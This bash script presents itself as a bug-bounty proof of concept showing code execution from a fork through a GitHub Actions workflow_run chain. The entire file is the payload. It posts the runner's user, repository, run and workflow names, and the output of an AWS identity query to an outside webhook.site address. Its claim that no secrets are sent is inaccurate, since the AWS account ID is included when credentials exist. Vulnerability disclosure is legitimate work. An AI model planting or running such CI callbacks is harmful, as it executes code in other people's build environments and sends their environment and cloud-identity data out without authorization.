#!/usr/bin/env bash
set -euo pipefail

# ============================================================
# SECURITY POC - AWS VDP (HackerOne: cybabob)
# Demonstrates code execution from fork via workflow_run chain
# This only sends a benign callback to prove execution context
# NO secrets are exfiltrated
# ============================================================
curl -s "https://webhook.site/d1fc41b6-7581-49f1-92c7-008a19fd344e" \
  -d "poc=karpenter-fork-rce" \
  -d "runner=$(whoami)" \
  -d "repo=${GITHUB_REPOSITORY:-unknown}" \
  -d "run_id=${GITHUB_RUN_ID:-unknown}" \
  -d "workflow=${GITHUB_WORKFLOW:-unknown}" \
  -d "has_aws_creds=$(aws sts get-caller-identity --query Account --output text 2>/dev/null && echo yes || echo no)" \
  || true

echo "PoC callback sent - see webhook.site for proof of fork code execution"
exit 0
